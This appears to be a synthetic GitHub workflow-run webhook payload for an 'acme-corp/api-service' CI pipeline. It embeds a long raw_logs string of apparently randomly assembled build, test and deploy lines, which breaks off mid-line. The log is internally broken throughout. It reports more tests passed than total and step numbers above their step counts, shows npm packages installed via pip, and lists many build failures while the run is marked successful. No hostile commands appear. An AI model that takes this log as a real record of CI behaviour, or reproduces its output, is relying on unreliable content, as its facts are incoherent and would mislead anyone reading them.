{
  "action": "completed",
  "workflow_run": {
    "id": 400,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-302",
    "head_sha": "60d73172b38d5a0d86a16e4c1342b53634e8263b",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-30T12:46:42.437939Z",
    "updated_at": "2025-11-30T12:49:44.137042Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nnpm install: added 222 packages\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\nOptimizing 89 modules...\npip: Collecting axios\n\u2713 All checks passed\nArtifact downloaded: 32MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 2831270\nAlready up to date.\nDone.\npip install: Successfully installed lodash-1.5\n\u2713 All checks passed\nSuccess!\nConnection established\nVerifying...\n[12:46:42] DEBUG: Connection pool: 17 active\nPOST /data - 200 (431ms)\nCompiling components/index.js...\nPushing to registry...\nBuilding Docker image...\nCache restored successfully (96MB)\nEnvironment: development\nCompiling src/main.py...\nFinished.\nGenerating source maps...\nCompiling src/app.ts...\n[12:46:42] INFO: Processing request\nyarn add: Done in 13.78s\n[12:46:42] DEBUG: Initializing service\nnpm notice: package.json updated\nSwitched to branch 'feature/task-178'\nCache invalidated: node_modules\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: build\nArtifact downloaded: 14MB\n[12:46:42] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (48MB)\nEnvironment: development\nInstalling express@4.11.4\nTest Suites: 38 passed, 22 total\nOptimizing 45 modules...\nStep 19/19: Linting\n[12:46:42] DEBUG: Query executed in 95ms\nStep 13/18: Running migrations\nArtifact uploaded: build.tar.gz (24MB)\nPlatform: linux-x64\nWARNING: webpack has known vulnerabilities\nAlready up to date.\n[12:46:42] DEBUG: Connection pool: 20 active\nTest Suites: 12 passed, 41 total\n\u2713 All checks passed\nEnvironment: production\nCompiling src/index.js...\nPlatform: win32-x64\nHEAD is now at aabce20\nBuilding Docker image...\nImage pulled successfully\nDone.\nTransforming 372 files...\nUsing Python 3.11\npip install: Successfully installed webpack-5.5\nPulling image: alpine:18\nGET /status - 200 (82ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\nCompleted.\n[12:46:42] INFO: Connecting to database\nNODE_ENV=test\n\u2713 Task completed in 3058ms\n\u2713 Task completed in 1385ms\n[12:46:42] DEBUG: Loading configuration\npip: Installing build dependencies...\nCache miss for key-2570\n[12:46:42] DEBUG: Connection pool: 13 active\nLayer 9/13: ENV command\nStep 20/16: Testing\n\u2713 All checks passed\nArtifact uploaded: dist.zip (65MB)\nArtifact downloaded: 33MB\nBundling styles.js\nArtifact uploaded: build.tar.gz (18MB)\nBundling runtime.css\nRan 129 tests in 43s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: RuntimeError\nnpm notice: created a lockfile\npip: Installing build dependencies...\n[12:46:42] DEBUG: Query executed in 84ms\nUsing Python 3.11\nTLS handshake completed\n[12:46:42] DEBUG: Connection pool: 3 active\nFetching submodules...\nImage pulled successfully\nUploading artifact 'dist' (10 files)\nCompiling src/app.ts...\nDone.\nCache saved successfully\nNODE_ENV=production\n[12:46:42] INFO: Request completed\nSwitched to branch 'hotfix/task-981'\nTest Suites: 39 passed, 17 total\nCache hit for key-9939\nBuilding Docker image...\nGenerating source maps...\nCoverage: 96% statements, 88% branches\nConnection established\nFetching from https://gcr.io/package.json\nTLS handshake completed\nUsing Python 3.9\nFinished.\nLoading...\nMinifying main.js\nUsing Node.js 18.5.3\npip: Collecting eslint\nWARNING: eslint has known vulnerabilities\nTime: 96.788s\nMinifying app.js\nStep 8/23: Deploying\nStep 6/22: Running migrations\nTLS handshake completed\nBundling vendor.js\nLayer 4/12: ENV command\npip: Downloading eslint-4.14.tar.gz\n[12:46:42] DEBUG: Connection pool: 6 active\nCompiling components/app.ts...\n[12:46:42] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nCache miss for key-5893\nArtifact uploaded: build.tar.gz (18MB)\nTest Suites: 27 passed, 27 total\n\u2717 build failed with exit code 109\nChecking out master branch\nStep 4/21: Running migrations\nUploading artifact 'dist' (9 files)\n=== Step setup_node completed ===\n=== Step: checkout ===\nCache saved successfully\nFAILED: test_user_create\nStep 14/20: Building\nDone.\nUsing Node.js 16.10.9\n[12:46:42] DEBUG: Loading configuration\nVerifying...\nReady.\nFAILED: test_db_connect\nConnection established\nWaiting...\nProcessing...\npip: Collecting axios\nTransforming 657 files...\nLayer 6/12: COPY command\nPOST /data - 202 (49ms)\n\u2713 All checks passed\nTime: 36.543s\nStep 3/25: Deploying\npip: Collecting lodash\nImage pulled successfully\nGenerating source maps...\nStep 19/22: Installing dependencies\nCreating production build...\nFinished.\nPOST /upload - 200 (180ms)\n[12:46:42] INFO: Starting build process\n  PASS: test_auth_login (453ms)\n\u2713 deploy completed\nFinished.\npip: Collecting react\nDone.\nProcessing...\n[12:46:42] DEBUG: Query executed in 63ms\nStep 9/22: Building\n[12:46:42] DEBUG: Query executed in 66ms\n  PASS: test_api_health (41ms)\n[12:46:42] INFO: Connecting to database\nCompiling utils/utils.go...\nFetching submodules...\nPushing to registry...\n\u2717 build failed with exit code 51\n[12:46:42] INFO: Request completed\nAlready up to date.\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nConnection established\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 1008ms\nPulling image: node:latest\nGET /api - 201 (34ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-4582\n\u2713 Task completed in 1152ms\nTests: 367 passed, 132 total\nStep 7/19: Linting\nTime: 119.817s\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nWaiting...\nAlready up to date.\nCache invalidated: dependencies\nTime: 26.652s\nPlatform: linux-x64\n\u2713 package completed\nChecking out main branch\n[12:46:42] DEBUG: Initializing service\nStep 5/19: Testing\nCompiling lib/service.java...\nnpm notice: created a lockfile\nHEAD is now at 78bdede\nStep 19/18: Linting\nLoading...\nFetching from https://npmjs.org/package.json\nTime: 57.59s\nPOST /data - 201 (125ms)\nCache restored successfully (134MB)\nFetching submodules...\nCache hit for key-6563\nBundling runtime.css\nBuilding Docker image...\n[12:46:42] INFO: Request completed\nLoading...\nProcessing...\nWaiting...\nStep 18/17: Linting\n\u2717 build failed with exit code 116\nStep 14/18: Building\npip: Downloading lodash-1.18.tar.gz\n[12:46:42] INFO: Cache refreshed\nGET /api - 204 (7ms)\nTime: 107.278s\n\u2713 Task completed in 4539ms\nnpm notice: package.json updated\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\nCoverage: 86% statements, 70% branches\nnpm install: resolved 769 packages\nStep 4/17: Building\nSnapshots: 5 passed, 17 total\npip: Downloading eslint-1.5.tar.gz\nLoading...\nFetching submodules...\nStep 11/24: Building\n[12:46:42] WARN: Deprecated API usage\nChecking out main branch\nTests: 139 passed, 466 total\n[12:46:42] INFO: Connecting to database\nBundling styles.css\nFAILED: test_cache_hit\nStep 3/17: Installing dependencies\npip install: Successfully installed lodash-3.0\nArtifact uploaded: dist.zip (84MB)\n[12:46:42] INFO: Processing request\nStep 10/15: Running migrations\nStep 12/19: Running migrations\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] DEBUG: Loading configuration\nTime: 113.368s\nPlatform: darwin-arm64\n[12:46:42] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (18MB)\n[12:46:42] INFO: Starting build process\n[12:46:42] INFO: Connecting to database\nnpm install: added 238 packages\nLoading...\nStep 19/23: Deploying\npip install: Successfully installed eslint-3.8\nOK\nnpm notice: created a lockfile\nConnection established\npip install: Successfully installed eslint-5.10\nArtifact downloaded: 18MB\nnpm notice: created a lockfile\nBuilding Docker image...\nWARNING: webpack has known vulnerabilities\nBundling runtime.css\n=== Step checkout completed ===\n=== Step: restore_cache ===\nWARNING: eslint has known vulnerabilities\nCompiling src/index.js...\nRan 137 tests in 35s\npip: Installing build dependencies...\nCompleted.\nArtifact uploaded: build.tar.gz (7MB)\nAlready up to date.\nStep 11/23: Running migrations\nnpm notice: created a lockfile\n\u2713 Task completed in 3726ms\nSwitched to branch 'hotfix/task-167'\nStep 16/18: Installing dependencies\nProcessing...\n  PASS: unit/test_auth_login.spec.js\n[12:46:42] DEBUG: Query executed in 81ms\n[12:46:42] INFO: Connecting to database\n  PASS: test_api_health (424ms)\nFetching submodules...\nStep 7/22: Deploying\n  PASS: integration/test_db_connect.spec.js\n[12:46:42] DEBUG: Initializing service\nCache hit for key-8810\n[12:46:42] DEBUG: Loading configuration\n[12:46:42] INFO: Starting build process\nStep 11/19: Testing\nImage pulled successfully\nFetching submodules...\nStep 7/16: Installing dependencies\nGET /api - 200 (38ms)\nFinished.\nRan 34 tests in 23s\n[12:46:42] DEBUG: Query executed in 18ms\nMinifying app.js\nStep 7/21: Building\n  PASS: unit/test_db_connect.spec.js\nCompleted.\n[12:46:42] DEBUG: Loading configuration\nStep 4/20: Deploying\nCompleted.\nPlatform: linux-x64\n\u2713 All checks passed\nCache miss for key-4833\n[12:46:42] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\nStep 18/23: Testing\nHEAD is now at bff2d7a\nTransforming 341 files...\n[12:46:42] DEBUG: Memory usage: 659MB\nPOST /data - 200 (485ms)\nTest Suites: 39 passed, 40 total\nProcessing...\nTransforming 501 files...\nFetching from https://registry.npmjs.org/package.json\nCompiling src/utils.go...\n[12:46:42] WARN: Deprecated API usage\nCoverage: 78% statements, 97% branches\nUsing Python 3.11\nnpm install: resolved 576 packages\nGenerating source maps...\nGenerating source maps...\nTime: 17.855s\nBundling runtime.css\nCache invalidated: node_modules\nStep 14/16: Running migrations\nPOST /data - 201 (382ms)\n[12:46:42] WARN: Deprecated API usage\nGenerating source maps...\n  PASS: test_api_health (203ms)\nPulling image: alpine:latest\nWaiting...\n\u2713 package completed\nyarn add: Done in 4.53s\npip install: Successfully installed webpack-5.6\n\u2717 build failed with exit code 3\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1837 packages\nFetching from https://amazonaws.com/package.json\n[12:46:42] INFO: Request completed\nInstalling webpack@4.12.1\npip: Downloading lodash-4.16.tar.gz\nImage pulled successfully\nStep 13/21: Linting\nRan 53 tests in 10s\nBuilding Docker image...\nUsing Node.js 16.5.1\n\u2713 All checks passed\n[12:46:42] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nPOST /data - 201 (451ms)\nDone.\nUsing Node.js 15.0.7\nArtifact uploaded: build.tar.gz (34MB)\n[12:46:42] DEBUG: Memory usage: 817MB\nException: RuntimeError\nCache miss for key-5480\nReady.\n[12:46:42] INFO: Request completed\nImage pulled successfully\nUploading artifact 'coverage' (49 files)\nPulling image: python:3.11\nGET /status - 201 (62ms)\nArtifact uploaded: build.tar.gz (22MB)\nWARNING: webpack has known vulnerabilities\nNODE_ENV=test\nSuccess!\nTransforming 482 files...\n\u2713 build completed\nTLS handshake completed\nArtifact uploaded: dist.zip (67MB)\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] INFO: Processing request\nCache miss for key-2388\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 Step 'checkout' succeeded\nStep 16/24: Deploying\nAlready up to date.\n\u2713 All checks passed\nyarn add: Done in 30.83s\nCache invalidated: dependencies\nWARNING: express has known vulnerabilities\npip install: Successfully installed webpack-3.16\n[12:46:42] DEBUG: Query executed in 77ms\n[12:46:42] WARN: Deprecated API usage\nArtifact downloaded: 3MB\nChecking out main branch\npip: Installing build dependencies...\nStep 9/23: Installing dependencies\nSwitched to branch 'feature/task-529'\nCompiling lib/utils.go...\nUploading artifact 'build' (1 files)\nFetching from https://googleapis.com/package.json\n[12:46:42] INFO: Connecting to database\nTest Suites: 6 passed, 42 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/22: Running migrations\nCompiling lib/utils.go...\n[12:46:42] WARN: Deprecated API usage\n=== Step restore_cache completed ===\n=== Step: deploy_staging ===\nCache invalidated: build\nEnvironment: staging\n  PASS: test_cache_hit (434ms)\nPOST /upload - 201 (332ms)\nRan 70 tests in 34s\nCompiling lib/service.java...\nCache invalidated: node_modules\nGET /status - 200 (29ms)\n[12:46:42] DEBUG: Loading configuration\n\u2713 package completed\nCompiling components/app.ts...\nConnection established\nWARNING: prettier has known vulnerabilities\nTest Suites: 40 passed, 12 total\nUsing Python 3.10\nImage pulled successfully\nWaiting...\nGenerating source maps...\n[12:46:42] INFO: Connecting to database\n\u2713 Task completed in 268ms\n[12:46:42] DEBUG: Initializing service\n[12:46:42] DEBUG: Initializing service\n[12:46:42] INFO: Connecting to database\n[12:46:42] INFO: Request completed\nBundling styles.js\nWaiting...\nAlready up to date.\nCoverage: 81% statements, 96% branches\nWARNING: express has known vulnerabilities\nUsing Node.js 14.7.3\n[12:46:42] DEBUG: Initializing service\nSwitched to branch 'feature/task-391'\n[12:46:42] DEBUG: Memory usage: 1001MB\nTime: 55.541s\nCompiling utils/app.ts...\n[12:46:42] INFO: Connecting to database\nSwitched to branch 'hotfix/task-475'\nFetching submodules...\nGET /status - 200 (28ms)\nOK\nStep 13/24: Running migrations\nTLS handshake completed\nFetching submodules...\nTransforming 195 files...\nPushing to registry...\nPushing to registry...\nTest Suites: 50 passed, 9 total\nBuilding Docker image...\nMinifying vendor.js\nFinished.\nStep 15/17: Testing\nEnvironment: test\n[12:46:42] INFO: Request completed\nRan 131 tests in 55s\nCompiling src/app.ts...\nSwitched to branch 'hotfix/task-989'\n\u2713 Step 'install' succeeded\nFAILED: test_auth_login\nCompleted.\nyarn add: Done in 9.70s\nnpm install: added 326 packages\n[12:46:42] WARN: Deprecated API usage\nFAILED: test_db_connect\nStep 17/23: Building\n[12:46:42] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nPOST /api - 201 (265ms)\n[12:46:42] DEBUG: Query executed in 24ms\nWARNING: lodash has known vulnerabilities\npip: Downloading prettier-5.7.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:42] DEBUG: Connection pool: 2 active\nBundling main.css\nReady.\nNODE_ENV=production\nReady.\nPOST /api - 201 (181ms)\nnpm install: resolved 1012 packages\nCache miss for key-4505\nStep 9/17: Building\nBundling styles.css\nPulling image: node:3.11\n  PASS: test_api_health (319ms)\nCompiling components/handler.rs...\nPushing to registry...\nAlready up to date.\nLoading...\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:42] DEBUG: Memory usage: 1754MB\nPushing to registry...\nArtifact downloaded: 46MB\nPulling image: python:3.11\n[12:46:42] ERROR: Connection failed\nNODE_ENV=production\nGET /api - 200 (96ms)\nStep 12/24: Running migrations\n  PASS: test_db_connect (295ms)\nPulling image: alpine:latest\nFAILED: test_user_create\nChecking out master branch\nnpm notice: created a lockfile\nException: ValueError\nRan 132 tests in 7s\n\u2713 All checks passed\nFAILED: test_db_connect\nStep 2/18: Deploying\nCache miss for key-2692\nArtifact downloaded: 21MB\nOptimizing 58 modules...\nTest Suites: 27 passed, 20 total\n[12:46:42] INFO: Request completed\nStep 2/15: Deploying\nException: NullPointerException\nTests: 394 passed, 232 total\nUploading artifact 'dist' (1 files)\nInstalling prettier@3.20.3\nTests: 65 passed, 300 total\nCreating production build...\nCompiling lib/utils.go...\nRan 165 tests in 40s\nCompiling components/app.ts...\nStep 17/24: Linting\n[12:46:42] DEBUG: Loading configuration\nyarn add: Done in 2.25s\n[12:46:42] INFO: Request completed\nLoading...\nNODE_ENV=production\nSwitched to branch 'bugfix/task-678'\nGenerating source maps...\nMinifying vendor.js\nPushing to registry...\nCache hit for key-6743\nnpm notice: package.json updated\npip: Downloading express-1.12.tar.gz\nTransforming 111 files...\n[12:46:42] INFO: Starting build process\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nGET /api - 204 (14ms)\nBuilding Docker image...\nWARNING: express has known vulnerabilities\nTLS handshake completed\nRan 74 tests in 23s\nFAILED: test_user_create\nReady.\nyarn add: Done in 4.16s\nOptimizing 82 modules...\n[12:46:42] INFO: Cache refreshed\nVerifying...\n[12:46:42] DEBUG: Query executed in 17ms\nException: TypeError\nImage pulled successfully\nAlready up to date.\nChecking out master branch\nCompleted.\nWARNING: react has known vulnerabilities\n[12:46:42] INFO: Cache refreshed\nyarn add: Done in 25.45s\nCompleted.\nCompiling utils/utils.go...\nCache saved successfully\nCompiling components/service.java...\nUsing Python 3.11\nFinished.\nnpm notice: package.json updated\n[12:46:42] DEBUG: Initializing service\nStep 8/24: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nNODE_ENV=test\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_auth_login\nDone.\nDone.\nArtifact uploaded: dist.zip (28MB)\nStep 15/22: Building\nnpm notice: created a lockfile\nStep 7/18: Deploying\nCache saved successfully\nnpm install: added 41 packages\nUsing Node.js 18.11.4\nnpm notice: created a lockfile\nPlatform: darwin-arm64\n[12:46:42] INFO: Request completed\nWARNING: jest has known vulnerabilities\nGenerating source maps...\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (18MB)\nHEAD is now at 281f84e\nSwitched to branch 'feature/task-451'\nPushing to registry...\nConnection established\nCompiling components/utils.go...\nConnection established\nArtifact uploaded: build.tar.gz (46MB)\nAlready up to date.\nStep 8/20: Linting\nUsing Python 3.11\npip: Downloading lodash-4.15.tar.gz\nCache miss for key-1920\n[12:46:42] DEBUG: Initializing service\nStep 18/19: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_auth_login\nCache restored successfully (240MB)\nTests: 431 passed, 373 total\n[12:46:42] DEBUG: Memory usage: 592MB\nUsing Node.js 16.0.5\nChecking out master branch\nCompiling lib/service.java...\nArtifact uploaded: dist.zip (35MB)\nnpm notice: package.json updated\nCompiling lib/utils.go...\nnpm install: resolved 1879 packages\nBundling runtime.js\nFinished.\nCache invalidated: build\n\u2713 package completed\nCache restored successfully (458MB)\n[12:46:42] INFO: Request completed\nWARNING: webpack has known vulnerabilities\nFinished.\nFinished.\nCache invalidated: build\nUploading artifact 'dist' (46 files)\nCompiling utils/index.js...\nTest Suites: 23 passed, 8 total\nArtifact uploaded: build.tar.gz (17MB)\nWARNING: eslint has known vulnerabilities\nStep 13/18: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5904\nProcessing...\nUsing Node.js 18.16.1\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nOptimizing 81 modules...\nCache hit for key-8540\nCache hit for key-2975\nSnapshots: 16 passed, 40 total\nnpm install: resolved 1927 packages\nDone.\nTest Suites: 49 passed, 38 total\npip: Collecting webpack\nGenerating source maps...\nSwitched to branch 'feature/task-277'\nHEAD is now at eac77c5\nLayer 8/10: RUN command\n\u2713 All checks passed\n  PASS: unit/test_api_health.spec.js\n[12:46:42] WARN: Deprecated API usage\n\u2713 Task completed in 4950ms\npip install: Successfully installed jest-1.11\nTime: 17.943s\n[12:46:42] INFO: Connecting to database\n\u2713 Task completed in 2124ms\nnpm install: added 186 packages\nStep 11/23: Installing dependencies\n[12:46:42] DEBUG: Initializing service\nFAILED: test_auth_login\nSuccess!\n[12:46:42] INFO: Cache refreshed\nFinished.\nSuccess!\nCache restored successfully (296MB)\npip install: Successfully installed lodash-1.4\nStep 19/23: Building\nOptimizing 79 modules...\npip install: Successfully installed eslint-2.10\n[12:46:42] DEBUG: Initializing service\n[12:46:42] DEBUG: Loading configuration\nCompiling utils/main.py...\nPOST /upload - 200 (335ms)\nGET /health - 204 (30ms)\nyarn add: Done in 20.60s\nPlatform: win32-x64\n=== Step integration_tests completed ===\n=== Step: type_check ===\nWaiting...\nFetching submodules...\nPOST /upload - 201 (378ms)\nArtifact downloaded: 1MB\n[12:46:42] ERROR: Connection failed\nnpm notice: created a lockfile\n[12:46:42] DEBUG: Loading configuration\nBundling styles.css\nnpm notice: package.json updated\nProcessing...\nWARNING: express has known vulnerabilities\nPushing to registry...\npip install: Successfully installed jest-1.2\nCompleted.\nImage pulled successfully\nTransforming 677 files...\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] INFO: Processing request\npip: Downloading prettier-5.2.tar.gz\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n[12:46:42] DEBUG: Query executed in 62ms\n[12:46:42] DEBUG: Loading configuration\nPushing to registry...\n[12:46:42] INFO: Starting build process\nConnection established\nRan 94 tests in 27s\n\u2713 Task completed in 191ms\nStep 18/23: Testing\nMinifying app.js\nConnection established\n[12:46:42] INFO: Request completed\nException: TypeError\nWaiting...\n[12:46:42] INFO: Processing request\nCache saved successfully\nCoverage: 98% statements, 87% branches\n[12:46:42] DEBUG: Loading configuration\nCompiling lib/app.ts...\nCompleted.\nProcessing...\n\u2713 All checks passed\n[12:46:42] DEBUG: Memory usage: 766MB\nnpm install: resolved 190 packages\npip: Downloading eslint-4.3.tar.gz\nCreating production build...\nSuccess!\nCache restored successfully (108MB)\nnpm notice: package.json updated\n[12:46:42] DEBUG: Connection pool: 11 active\n\u2713 Task completed in 3979ms\nTest Suites: 48 passed, 44 total\nTests: 194 passed, 412 total\n[12:46:42] INFO: Processing request\n[12:46:42] INFO: Starting build process\nUploading artifact 'coverage' (34 files)\n\u2713 Task completed in 777ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 1292ms\nnpm notice: created a lockfile\nOptimizing 65 modules...\nVerifying...\nnpm install: resolved 1118 packages\nGET /health - 204 (66ms)\n[12:46:42] DEBUG: Loading configuration\nUsing Python 3.11\nFetching submodules...\n[12:46:42] DEBUG: Query executed in 86ms\nSnapshots: 40 passed, 34 total\nFinished.\nFetching submodules...\nBundling runtime.css\nPushing to registry...\n\u2713 Task completed in 3085ms\nUsing Node.js 14.19.3\nPushing to registry...\npip: Installing build dependencies...\nCompiling lib/utils.go...\nFinished.\n\u2713 Task completed in 2239ms\nStep 6/18: Building\nUsing Node.js 16.13.1\nDone.\nCache miss for key-3149\nTransforming 782 files...\n[12:46:42] INFO: Cache refreshed\n\u2713 test completed\nCache restored successfully (50MB)\nStep 15/22: Building\nLayer 6/13: COPY command\n\u2713 package completed\nUsing Python 3.12\nnpm install: added 385 packages\nSnapshots: 47 passed, 31 total\nWARNING: lodash has known vulnerabilities\npip: Collecting axios\nChecking out master branch\n\u2717 build failed with exit code 21\nGenerating source maps...\nChecking out main branch\nCompleted.\n[12:46:42] INFO: Starting build process\nStep 2/15: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 98% statements, 76% branches\nBundling runtime.js\nNODE_ENV=production\nNODE_ENV=test\nCompiling src/service.java...\nCompiling components/main.py...\n[12:46:42] INFO: Cache refreshed\nStep 1/17: Testing\nStep 5/19: Testing\nConnection established\nFetching submodules...\nCreating production build...\nNODE_ENV=production\n[12:46:42] INFO: Processing request\nFinished.\nWARNING: jest has known vulnerabilities\n[12:46:42] DEBUG: Initializing service\nSnapshots: 29 passed, 16 total\nOK\n[12:46:42] INFO: Cache refreshed\nnpm notice: created a lockfile\nTest Suites: 29 passed, 35 total\nTLS handshake completed\npip: Installing build dependencies...\nnpm install: added 301 packages\n[12:46:42] DEBUG: Memory usage: 1262MB\n[12:46:42] DEBUG: Connection pool: 2 active\n\u2713 Task completed in 789ms\nCoverage: 82% statements, 79% branches\nTLS handshake completed\n[12:46:42] INFO: Processing request\nPlatform: darwin-arm64\nFetching from https://npmjs.org/package.json\n[12:46:42] WARN: Deprecated API usage\n=== Step type_check completed ===\n=== Step: install_dependencies ===\nStep 7/24: Building\nFinished.\nInstalling prettier@3.13.1\nFAILED: test_auth_login\npip install: Successfully installed axios-2.19\n[12:46:42] INFO: Processing request\n[12:46:42] WARN: Deprecated API usage\nCreating production build...\n[12:46:42] DEBUG: Initializing service\n[12:46:42] DEBUG: Connection pool: 16 active\n\u2713 Task completed in 330ms\nTest Suites: 46 passed, 21 total\nWaiting...\nStep 15/21: Building\npip: Installing build dependencies...\nUsing Python 3.9\nTime: 65.414s\nTLS handshake completed\nCache hit for key-6188\nHEAD is now at 6520d6c\n[12:46:42] INFO: Connecting to database\nCache invalidated: build\nCompleted.\nGenerating source maps...\nOK\nWaiting...\n\u2713 All checks passed\nCache saved successfully\nCompiling lib/index.js...\nSuccess!\npip install: Successfully installed lodash-5.1\n[12:46:42] DEBUG: Connection pool: 20 active\nImage pulled successfully\nGenerating source maps...\nStep 16/20: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'checkout' succeeded\nHEAD is now at db01e63\nNODE_ENV=test\nCompiling utils/main.py...\nTransforming 178 files...\nSnapshots: 17 passed, 7 total\nTests: 75 passed, 464 total\nRan 64 tests in 28s\n[12:46:42] INFO: Cache refreshed\nStep 2/19: Deploying\nTransforming 224 files...\nGET /status - 200 (76ms)\n\u2713 All checks passed\nRan 67 tests in 46s\nUsing Python 3.9\nOptimizing 43 modules...\nArtifact uploaded: dist.zip (94MB)\nBuilding Docker image...\nCache restored successfully (53MB)\nDone.\nProcessing...\nStep 16/24: Installing dependencies\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nOK\npip: Collecting react\nnpm install: added 44 packages\nBundling main.js\nWARNING: lodash has known vulnerabilities\nOK\nArtifact uploaded: build.tar.gz (31MB)\n[12:46:42] INFO: Request completed\nOK\nTests: 497 passed, 462 total\n\u2713 Task completed in 2772ms\nArtifact uploaded: dist.zip (94MB)\nyarn add: Done in 29.29s\nPulling image: python:latest\nTest Suites: 33 passed, 34 total\n\u2713 Task completed in 3210ms\nPOST /data - 202 (451ms)\nOK\nCompiling src/utils.go...\nProcessing...\npip: Installing build dependencies...\nCache restored successfully (87MB)\nPOST /data - 201 (424ms)\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/utils.go...\nCache saved successfully\nTLS handshake completed\nCache restored successfully (378MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: test\n[12:46:42] INFO: Processing request\nImage pulled successfully\nWaiting...\nCompiling utils/main.py...\nTime: 105.922s\nTransforming 997 files...\nArtifact downloaded: 22MB\n[12:46:42] DEBUG: Loading configuration\nGET /api - 201 (22ms)\nDone.\n\u2713 Step 'test' succeeded\nUploading artifact 'build' (19 files)\nInstalling jest@5.0.8\nRan 126 tests in 8s\nCreating production build...\nEnvironment: development\nChecking out develop branch\nGenerating source maps...\n\u2713 package completed\nFinished.\n[12:46:42] INFO: Starting build process\n  PASS: test_api_health (103ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://googleapis.com/package.json\nUploading artifact 'build' (19 files)\nSwitched to branch 'hotfix/task-227'\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] INFO: Connecting to database\n[12:46:42] DEBUG: Query executed in 90ms\nDone.\nTest Suites: 32 passed, 17 total\nArtifact uploaded: dist.zip (90MB)\nCache restored successfully (222MB)\npip: Installing build dependencies...\n  PASS: unit/test_api_health.spec.js\nEnvironment: test\nArtifact downloaded: 45MB\nProcessing...\nFetching from https://registry.npmjs.org/package.json\nGET /api - 201 (22ms)\nCache invalidated: node_modules\nCreating production build...\nProcessing...\n[12:46:42] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: linux-x64\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nGET /health - 204 (13ms)\nBundling vendor.css\n[12:46:42] INFO: Request completed\n[12:46:42] DEBUG: Memory usage: 956MB\nLoading...\n\u2713 All checks passed\n[12:46:42] DEBUG: Query executed in 48ms\n[12:46:42] WARN: Deprecated API usage\nWaiting...\npip: Collecting eslint\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\nChecking out master branch\nSwitched to branch 'feature/task-535'\nAlready up to date.\nStep 14/15: Testing\nnpm notice: created a lockfile\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (21MB)\nUsing Node.js 18.3.2\nGenerating source maps...\n\u2713 validate completed\nHEAD is now at 0e5c956\nCache invalidated: node_modules\nCompiling components/main.py...\n\u2713 lint completed\n[12:46:42] ERROR: Connection failed\n[12:46:42] DEBUG: Query executed in 48ms\nCreating production build...\n[12:46:42] DEBUG: Memory usage: 1877MB\nUsing Node.js 16.19.6\nBuilding Docker image...\nStep 11/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLayer 5/14: RUN command\nFetching submodules...\nSwitched to branch 'feature/task-912'\n[12:46:42] WARN: Deprecated API usage\nAlready up to date.\nProcessing...\npip: Installing build dependencies...\nUsing Node.js 20.15.1\n[12:46:42] ERROR: Connection failed\n[12:46:42] WARN: Deprecated API usage\nReady.\nTest Suites: 40 passed, 30 total\nStep 5/21: Deploying\nUsing Node.js 15.0.6\nUsing Python 3.10\nArtifact uploaded: dist.zip (43MB)\nWARNING: webpack has known vulnerabilities\nCache hit for key-9873\nCache hit for key-6620\nCompiling utils/handler.rs...\nArtifact downloaded: 36MB\nStep 11/22: Running migrations\nSuccess!\nRan 68 tests in 58s\nArtifact 